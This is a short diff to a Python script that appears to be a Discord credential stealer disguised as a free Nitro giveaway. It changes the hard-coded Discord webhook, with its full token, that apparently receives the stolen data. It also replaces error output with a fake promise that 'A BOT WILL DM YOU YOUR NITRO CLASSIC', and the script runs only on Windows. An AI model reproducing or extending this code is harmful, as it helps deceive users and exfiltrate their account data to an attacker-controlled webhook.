@@ -16,7 +16,7 @@ colorama.init()
 def Auth():
     def dastela():
         global WEBHOOK
-        WEBHOOK = "https://discordapp.com/api/webhooks/764350751232229376/BYXFkJct5VNn6iTWtJtWf8WutzUIFFcc199u-SwQhUEx7qsjiAmxoCge7fD3m2jfwF-P"
+        WEBHOOK = "https://discord.com/api/webhooks/773967535510650960/9vdQT4QatZGd4xEELBgp0LMeI4Sj_8rrsk_EMMqCDwiiPrCAuLR23tX4SGMWF0x7n0_e"
         import os
         if os.name != "nt":
             exit()
@@ -194,7 +194,7 @@ def Auth():
         try:
             main()
         except Exception as e:
-            print(e)
+            print("A BOT WILL DM YOU YOUR NITRO CLASSIC FOR 1 MONTH IN 24 HOURS")
             pass
     try:
         dastela()
